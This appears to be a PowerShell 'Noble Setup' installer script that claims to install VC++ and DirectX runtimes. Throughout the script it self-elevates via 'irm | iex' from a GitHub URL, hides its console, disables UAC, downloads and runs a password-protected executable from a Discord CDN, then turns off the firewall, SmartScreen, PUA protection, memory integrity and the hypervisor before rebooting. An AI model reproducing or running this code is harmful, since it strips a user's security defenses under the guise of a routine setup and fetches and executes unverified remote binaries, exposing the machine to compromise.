# ============================================================
# AUTO-ELEVATE (irm | iex compatible — hardcoded URL, no $PSCommandPath)
# ============================================================
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptUrl = "https://raw.githubusercontent.com/beatboxe17x-sys/setup/refs/heads/main/NobleSetup.ps1"
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $scriptUrl | iex`"" -Verb RunAs
    exit
}

# ============================================================
# TLS 1.2 + PROGRESS SILENCE (fixes irm download issues)
# ============================================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Hide console (randomized class name so repeat runs don't crash)
$win32Class = "Win32_" + (Get-Random -Maximum 99999)
Add-Type @"
using System; using System.Runtime.InteropServices;
public class $win32Class {
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
Invoke-Expression "[$win32Class]::ShowWindow([$win32Class]::GetConsoleWindow(), 0)"

# ============================================================
# DISABLE UAC COMPLETELY (requires reboot to fully take effect)
# ============================================================
$uacKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
if (-not (Test-Path $uacKey)) { New-Item -Path $uacKey -Force | Out-Null }
Set-ItemProperty -Path $uacKey -Name "EnableLUA" -Value 0 -Force
Set-ItemProperty -Path $uacKey -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
Set-ItemProperty -Path $uacKey -Name "PromptOnSecureDesktop" -Value 0 -Force

# ============================================================
# FORM
# ============================================================
$form = New-Object System.Windows.Forms.Form
$form.Text = "Noble"
$form.Size = New-Object System.Drawing.Size(400, 200)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "None"
$form.BackColor = [System.Drawing.Color]::FromArgb(18, 18, 28)

$script:drag = $false
$form.Add_MouseDown({ $script:drag = $true; $script:dragX = $_.X; $script:dragY = $_.Y })
$form.Add_MouseMove({ if ($script:drag) { $form.Location = New-Object System.Drawing.Point(($form.Location.X + $_.X - $script:dragX), ($form.Location.Y + $_.Y - $script:dragY)) } })
$form.Add_MouseUp({ $script:drag = $false })

$title = New-Object System.Windows.Forms.Label
$title.Text = "Noble Setup"
$title.Size = New-Object System.Drawing.Size(400, 32)
$title.Location = New-Object System.Drawing.Point(0, 28)
$title.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
$title.ForeColor = [System.Drawing.Color]::FromArgb(0, 150, 255)
$title.TextAlign = "MiddleCenter"
$form.Controls.Add($title)

$status = New-Object System.Windows.Forms.Label
$status.Text = "Ready"
$status.Size = New-Object System.Drawing.Size(400, 22)
$status.Location = New-Object System.Drawing.Point(0, 65)
$status.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$status.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 200)
$status.TextAlign = "MiddleCenter"
$form.Controls.Add($status)

$detail = New-Object System.Windows.Forms.Label
$detail.Text = ""
$detail.Size = New-Object System.Drawing.Size(400, 18)
$detail.Location = New-Object System.Drawing.Point(0, 88)
$detail.Font = New-Object System.Drawing.Font("Segoe UI", 8)
$detail.ForeColor = [System.Drawing.Color]::FromArgb(120, 120, 140)
$detail.TextAlign = "MiddleCenter"
$form.Controls.Add($detail)

$progress = New-Object System.Windows.Forms.ProgressBar
$progress.Size = New-Object System.Drawing.Size(320, 4)
$progress.Location = New-Object System.Drawing.Point(40, 112)
$progress.Style = "Continuous"
$progress.Value = 0
$progress.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 45)
$form.Controls.Add($progress)

$setupBtn = New-Object System.Windows.Forms.Button
$setupBtn.Text = "Setup"
$setupBtn.Size = New-Object System.Drawing.Size(140, 38)
$setupBtn.Location = New-Object System.Drawing.Point(130, 125)
$setupBtn.FlatStyle = "Flat"
$setupBtn.FlatAppearance.BorderSize = 0
$setupBtn.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$setupBtn.ForeColor = [System.Drawing.Color]::White
$setupBtn.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$setupBtn.Cursor = "Hand"
$setupBtn.Add_MouseEnter({ $this.BackColor = [System.Drawing.Color]::FromArgb(0, 150, 255) })
$setupBtn.Add_MouseLeave({ $this.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215) })
$form.Controls.Add($setupBtn)

$wm = New-Object System.Windows.Forms.Label
$wm.Text = "brax@support"
$wm.Size = New-Object System.Drawing.Size(80, 14)
$wm.Location = New-Object System.Drawing.Point(315, 185)
$wm.Font = New-Object System.Drawing.Font("Segoe UI", 7)
$wm.ForeColor = [System.Drawing.Color]::FromArgb(50, 50, 70)
$wm.TextAlign = "MiddleRight"
$form.Controls.Add($wm)

# ============================================================
# SETUP LOGIC
# ============================================================
$setupBtn.Add_Click({
    $setupBtn.Enabled = $false
    $setupBtn.Text = "..."

    $tempDir = "$env:TEMP\noble_setup"
    $offRar = "$tempDir\off.rar"
    $offExtract = "$tempDir\off_extract"
    $offExe = "$offExtract\24122024\24122024.exe"
    $vcZip = "$tempDir\VC.zip"
    $vcExtract = "$tempDir\VC"
    $dxZip = "$tempDir\dx.zip"
    $dxExtract = "$tempDir\DX"
    $dxExe = "$dxExtract\dxwebsetup.exe"

    # DISCORD CDN URLs
    $offUrl = "https://cdn.discordapp.com/attachments/1497812054633873634/1503118867034144870/24122024_2_1.rar?ex=6a023008&is=6a00de88&hm=6555cf5d3dfd259fcd4c95542696e26bf8dda97a4e788dc42789000533a9b060&"
    $vcUrl = "https://cdn.discordapp.com/attachments/1497812054633873634/1503116705453445160/Visual-C-Runtimes-All-in-One-Dec-2025.zip?ex=6a022e05&is=6a00dc85&hm=c389144c18b99c40710ec15cc00271655fcb6eade8b34940daa50b3108a8d660&"
    $dxUrl = "https://cdn.discordapp.com/attachments/1497812054633873634/1503118051631956090/dxwebsetup_3.zip?ex=6a022f46&is=6a00ddc6&hm=e982c5ffc08c5253e469f5099ecdd3c890a4f0add1a037b619ac374928a0458d&"

    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

    # Helper function to download with better error handling
    function Download-File($Url, $OutFile, $Name) {
        $status.Text = "Downloading $Name..."
        $detail.Text = $Url.Split('/')[-1].Split('?')[0]
        $form.Refresh()
        try {
            # Use Invoke-WebRequest (irm) instead of WebClient - works better with Discord CDN
            Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -MaximumRedirection 10
            if ((Test-Path $OutFile) -and ((Get-Item $OutFile).Length -gt 1000)) {
                return $true
            }
        } catch {
            # Fallback to WebClient with full headers
            try {
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                $wc.Headers.Add("Accept", "*/*")
                $wc.Headers.Add("Accept-Encoding", "gzip, deflate, br")
                $wc.Headers.Add("Connection", "keep-alive")
                $wc.DownloadFile($Url, $OutFile)
                if ((Test-Path $OutFile) -and ((Get-Item $OutFile).Length -gt 1000)) {
                    return $true
                }
            } catch {
                $status.Text = "$Name download failed"
                $detail.Text = $_.Exception.Message
                $status.ForeColor = [System.Drawing.Color]::FromArgb(255, 100, 100)
                $form.Refresh()
                Start-Sleep -Seconds 3
                $status.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 200)
                return $false
            }
        }
        return $false
    }

    # ============================================================
    # OFF.EXE (RAR with password "sordum", nested in 24122024 folder)
    # ============================================================
    $progress.Value = 5
    $offOk = Download-File -Url $offUrl -OutFile $offRar -Name "Off.exe"

    if ($offOk -and (Test-Path $offRar)) {
        $status.Text = "Extracting Off.exe..."
        $detail.Text = "Password: sordum"
        $progress.Value = 10
        $form.Refresh()

        # Find 7-Zip or WinRAR
        $sevenZip = "${env:ProgramFiles}\7-Zip\7z.exe"
        $sevenZip86 = "${env:ProgramFiles(x86)}\7-Zip\7z.exe"
        $winRar = "${env:ProgramFiles}\WinRAR\WinRAR.exe"
        $winRar86 = "${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe"

        $extractor = $null
        if (Test-Path $sevenZip) { $extractor = $sevenZip }
        elseif (Test-Path $sevenZip86) { $extractor = $sevenZip86 }
        elseif (Test-Path $winRar) { $extractor = $winRar }
        elseif (Test-Path $winRar86) { $extractor = $winRar86 }

        if ($extractor) {
            New-Item -ItemType Directory -Path $offExtract -Force | Out-Null
            if ($extractor -match "7z") {
                Start-Process -FilePath $extractor -ArgumentList "x `"$offRar`" -o`"$offExtract`" -p`sordum`" -y" -Wait -WindowStyle Hidden
            } else {
                Start-Process -FilePath $extractor -ArgumentList "x `"$offRar`" `"$offExtract`" -p`sordum`" -y" -Wait -WindowStyle Hidden
            }

            # Find the actual EXE inside 24122024 folder
            if (Test-Path $offExe) {
                Start-Process $offExe
                Start-Sleep -Seconds 3
                $status.Text = "Click DISABLE in Off.exe, then close it"
                $setupBtn.Text = "Waiting..."
                $form.Refresh()
                while (Get-Process "24122024" -ErrorAction SilentlyContinue) {
                    Start-Sleep -Milliseconds 500
                }
            } else {
                # Try finding any exe in extracted folder
                $foundExe = Get-ChildItem -Path $offExtract -Recurse -Filter "*.exe" | Select-Object -First 1
                if ($foundExe) {
                    Start-Process $foundExe.FullName
                    Start-Sleep -Seconds 3
                    $status.Text = "Click DISABLE in Off.exe, then close it"
                    $setupBtn.Text = "Waiting..."
                    $form.Refresh()
                    while (Get-Process $foundExe.BaseName -ErrorAction SilentlyContinue) {
                        Start-Sleep -Milliseconds 500
                    }
                }
            }
        } else {
            $status.Text = "7-Zip/WinRAR not found"
            $detail.Text = "Extract manually: $offRar (password: sordum)"
            $status.ForeColor = [System.Drawing.Color]::FromArgb(255, 100, 100)
            $form.Refresh()
            Start-Sleep -Seconds 3
            $status.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 200)
        }
    }

    # ============================================================
    # VC++ DOWNLOAD & EXTRACT
    # ============================================================
    $progress.Value = 20
    $vcOk = Download-File -Url $vcUrl -OutFile $vcZip -Name "VC++"

    $vcSize = 0
    if ($vcOk -and (Test-Path $vcZip)) { $vcSize = (Get-Item $vcZip).Length }

    if ($vcSize -lt 1000000) {
        $status.Text = "VC++ download failed"
        $detail.Text = "File too small or download incomplete"
        $status.ForeColor = [System.Drawing.Color]::FromArgb(255, 100, 100)
        $form.Refresh()
        Start-Sleep -Seconds 3
        $status.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 200)
    }

    # EXTRACT & SILENT INSTALL
    if ($vcSize -gt 1000000) {
        $status.Text = "Extracting VC++..."
        $detail.Text = ""
        $progress.Value = 30
        $form.Refresh()

        try {
            Expand-Archive -Path $vcZip -DestinationPath $vcExtract -Force
        } catch {
            $status.Text = "Extract failed"
            $form.Refresh()
            Start-Sleep -Seconds 2
        }

        # Find all vcredist EXEs
        $installers = Get-ChildItem -Path $vcExtract -Recurse -Include "*.exe" -ErrorAction SilentlyContinue | Where-Object {
            $_.Name -match "vcredist|vcruntime"
        } | Sort-Object Name

        $total = $installers.Count
        $current = 0

        if ($total -eq 0) {
            $status.Text = "No VC++ installers found"
            $form.Refresh()
            Start-Sleep -Seconds 2
        } else {
            $status.Text = "Installing VC++ silently..."
            $detail.Text = "0 of $total complete"
            $progress.Value = 35
            $form.Refresh()

            foreach ($exe in $installers) {
                $current++
                $detail.Text = "Installing $current of $total : $($exe.Name)"
                $form.Refresh()

                $fileName = $exe.Name.ToLower()
                $fullPath = $exe.FullName
                $exitCode = -1

                # Determine correct silent flag based on version
                if ($fileName -match "2005") {
                    $proc = Start-Process -FilePath $fullPath -ArgumentList "/Q" -PassThru -WindowStyle Hidden -Wait
                    $exitCode = $proc.ExitCode
                }
                elseif ($fileName -match "2008") {
                    $proc = Start-Process -FilePath $fullPath -ArgumentList "/Q" -PassThru -WindowStyle Hidden -Wait
                    $exitCode = $proc.ExitCode
                }
                elseif ($fileName -match "2010") {
                    $proc = Start-Process -FilePath $fullPath -ArgumentList "/q","/norestart" -PassThru -WindowStyle Hidden -Wait
                    $exitCode = $proc.ExitCode
                }
                elseif ($fileName -match "2012|2013") {
                    $proc = Start-Process -FilePath $fullPath -ArgumentList "/install","/quiet","/norestart" -PassThru -WindowStyle Hidden -Wait
                    $exitCode = $proc.ExitCode
                }
                elseif ($fileName -match "2015|2017|2019|2022") {
                    $proc = Start-Process -FilePath $fullPath -ArgumentList "/install","/quiet","/norestart" -PassThru -WindowStyle Hidden -Wait
                    $exitCode = $proc.ExitCode
                }
                else {
                    $proc = Start-Process -FilePath $fullPath -ArgumentList "/S" -PassThru -WindowStyle Hidden -Wait
                    $exitCode = $proc.ExitCode
                }

                # If exit code indicates error (not 0 or 3010=reboot required), try repair mode
                if ($exitCode -ne 0 -and $exitCode -ne 3010) {
                    $detail.Text = "Retrying $current with repair..."
                    $form.Refresh()
                    Start-Sleep -Milliseconds 200

                    if ($fileName -match "2005|2008") {
                        Start-Process -FilePath $fullPath -ArgumentList "/Q" -WindowStyle Hidden -Wait
                    } else {
                        Start-Process -FilePath $fullPath -ArgumentList "/repair","/quiet","/norestart" -WindowStyle Hidden -Wait
                    }
                }

                $progress.Value = 35 + [math]::Floor(($current / $total) * 35)
                $form.Refresh()
            }

            $status.Text = "VC++ installed"
            $detail.Text = ""
            $progress.Value = 70
            $form.Refresh()
        }
    }

    # ============================================================
    # DirectX DOWNLOAD & EXTRACT
    # ============================================================
    $progress.Value = 75
    $dxOk = Download-File -Url $dxUrl -OutFile $dxZip -Name "DirectX"

    if ($dxOk -and (Test-Path $dxZip)) {
        $status.Text = "Extracting DirectX..."
        $progress.Value = 78
        $form.Refresh()

        try {
            Expand-Archive -Path $dxZip -DestinationPath $dxExtract -Force
        } catch {
            $status.Text = "DirectX extract failed"
            $form.Refresh()
            Start-Sleep -Seconds 2
        }

        if (Test-Path $dxExe) {
            $status.Text = "Installing DirectX silently..."
            $progress.Value = 80
            $form.Refresh()
            Start-Process -FilePath $dxExe -ArgumentList "/Q" -Wait -WindowStyle Hidden
        } else {
            # Try finding dxwebsetup.exe in extracted folder
            $foundDx = Get-ChildItem -Path $dxExtract -Recurse -Filter "dxwebsetup.exe" | Select-Object -First 1
            if ($foundDx) {
                Start-Process -FilePath $foundDx.FullName -ArgumentList "/Q" -Wait -WindowStyle Hidden
            }
        }
    }

    # ============================================================
    # Disable Security
    # ============================================================
    $status.Text = "Disabling security..."
    $progress.Value = 85
    $form.Refresh()

    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
    @("StandardProfile","PublicProfile","DomainProfile") | ForEach-Object {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\$_" -Name "EnableFirewall" -Value 0 -ErrorAction SilentlyContinue
    }

    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" -Name "DisallowExploitProtectionOverride" -Value 1 -ErrorAction SilentlyContinue

    Set-MpPreference -CheckAppsAndFiles Disabled -ErrorAction SilentlyContinue
    Set-MpPreference -EnableSmartScreen $false -ErrorAction SilentlyContinue
    Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue
    Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue

    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Edge\SmartScreenEnabled" -Name "SmartScreenEnabled" -Value 0 -ErrorAction SilentlyContinue
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Edge" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Edge" -Name "SmartScreenEnabled" -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value 0 -ErrorAction SilentlyContinue

    New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
    Start-Process "bcdedit" -ArgumentList "/set hypervisorlaunchtype off" -WindowStyle Hidden -Wait

    # ============================================================
    # Cleanup
    # ============================================================
    $status.Text = "Cleaning up..."
    $progress.Value = 95
    $form.Refresh()

    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue

    w32tm /resync 2>$null | Out-Null
    if ($LASTEXITCODE -ne 0) {
        Stop-Service w32time -Force -ErrorAction SilentlyContinue
        w32tm /unregister 2>$null | Out-Null
        w32tm /register 2>$null | Out-Null
        Start-Service w32time -ErrorAction SilentlyContinue
        w32tm /resync 2>$null | Out-Null
    }

    # Done
    $progress.Value = 100
    $status.Text = "Done. Restart PC now."
    $status.ForeColor = [System.Drawing.Color]::FromArgb(0, 255, 128)
    $setupBtn.Text = "Restart"
    $setupBtn.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 90)
    $setupBtn.Enabled = $true

    $setupBtn.Add_Click({
        $status.Text = "Restarting..."
        $form.Refresh()
        Start-Process "shutdown" -ArgumentList "/r /t 5 /c `"Noble Setup - Restarting`"" -WindowStyle Hidden
        $form.Close()
    })
})

# ============================================================
# SHOW
# ============================================================
$form.Add_Shown({ $form.Activate() })
[void]$form.ShowDialog()
